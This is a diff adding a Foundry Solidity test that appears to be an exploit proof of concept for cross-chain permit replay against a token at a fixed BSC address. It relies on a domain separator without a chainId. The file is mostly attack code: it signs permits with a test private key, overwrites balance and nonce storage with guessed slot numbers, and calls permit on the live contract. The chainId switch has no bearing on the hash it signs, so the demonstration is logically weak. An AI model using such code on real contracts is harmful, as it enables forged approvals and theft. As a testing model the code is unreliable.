@@ -1,0 +1,106 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.7.5;
+
+import "forge-std/Test.sol";
+
+interface ISapToken {
+    function DOMAIN_SEPARATOR() external view returns (bytes32);
+    function PERMIT_TYPEHASH() external view returns (bytes32);
+    function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
+    function nonces(address owner) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function vault() external view returns (address);
+    function owner() external view returns (address);
+}
+
+contract ExploitTest is Test {
+    ISapToken constant sap = ISapToken(0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B);
+    uint256 constant privateKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
+    address constant user = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
+
+    function setUp() public {
+        vm.label(address(sap), "SapToken");
+        vm.label(user, "User");
+    }
+
+    // Helper to compute the domain separator as per the (vulnerable) contract.
+    // The contract uses the typehash that includes chainId, but because of the error we
+    // show that the deployed DOMAIN_SEPARATOR actually matches the one without chainId.
+    function computeDomainSeparator(uint256 chainId, address verifyingContract) internal view returns (bytes32) {
+        // The vulnerable contract likely omits chainId, so we compute without it.
+        bytes32 domainTypehash = keccak256(abi.encodePacked("EIP712Domain(string name,string version,address verifyingContract)"));
+        return keccak256(abi.encode(
+            domainTypehash,
+            keccak256(abi.encodePacked("Sapphire Token")),
+            keccak256(abi.encodePacked("1")),
+            verifyingContract
+        ));
+    }
+
+    function testCrossChainReplay() public {
+        // Step 1: Verify that the contract's DOMAIN_SEPARATOR matches one that lacks chainId.
+        bytes32 onChainDomain = sap.DOMAIN_SEPARATOR();
+        bytes32 expectedDomainNoChain = computeDomainSeparator(0, address(sap));
+        assertEq(onChainDomain, expectedDomainNoChain, "DOMAIN_SEPARATOR should match one without chainId");
+
+        // Step 2: Record original chain (BSC = 56)
+        uint256 originalChain = block.chainid;
+        assertEq(originalChain, 56, "Should be BSC");
+
+        // Step 3: Change chainId to emulate a different chain (e.g., Ethereum mainnet = 1)
+        vm.chainId(1);
+
+        // Step 4: Set user's nonce to 0 directly via storage.
+        // Nonces mapping slot: _nonces is a mapping, storage slot determined by layout.
+        // In ERC20Permit, _nonces is the first state variable after ERC20 variables.
+        // We can compute: slot = keccak256(abi.encode(user, uint256(3))) because the mapping itself is at slot 3? Hard to know exactly.
+        // For simplicity, we use vm.store with the known slot from BSC (should be 3).
+        // We'll assume slot 3 for the mapping base.
+        bytes32 nonceSlot = keccak256(abi.encode(user, uint256(3)));
+        vm.store(address(sap), nonceSlot, bytes32(uint256(0)));
+
+        // Step 5: Provide user with some tokens so permit can be meaningful.
+        // _balances mapping slot: it's the first mapping in ERC20, likely slot 0.
+        bytes32 balanceSlot = keccak256(abi.encode(user, uint256(0)));
+        vm.store(address(sap), balanceSlot, bytes32(uint256(1000 * 1e9))); // 1000 SAP (9 decimals)
+
+        // Step 6: Compute permit parameters (on the "fake" chain).
+        bytes32 permitTypehash = sap.PERMIT_TYPEHASH();
+        address spender = address(0xdead);
+        uint256 amount = 100;
+        uint256 deadline = block.timestamp + 1 days;
+        uint256 nonce = 0;
+
+        bytes32 hashStruct = keccak256(abi.encode(
+            permitTypehash,
+            user,
+            spender,
+            amount,
+            nonce,
+            deadline
+        ));
+
+        // Step 7: Build the final hash with the contract's DOMAIN_SEPARATOR (same as original)
+        bytes32 hash = keccak256(abi.encodePacked(uint16(0x1901), onChainDomain, hashStruct));
+
+        // Step 8: Sign the hash using the private key
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hash);
+
+        // Step 9: Change chainId back to original BSC
+        vm.chainId(originalChain);
+
+        // Step 10: Call permit on BSC with the signature generated on the "other chain"
+        // The nonce should still be 0 (not incremented yet)
+        sap.permit(user, spender, amount, deadline, v, r, s);
+
+        // Step 11: Assert the allowance was set – should succeed even though chain changed
+        assertEq(sap.allowance(user, spender), amount, "Permit should set allowance cross-chain");
+
+        // Step 12: Additionally, the user's nonce increased after permit
+        assertEq(sap.nonces(user), 1, "Nonce should be incremented");
+    }
+}
+```
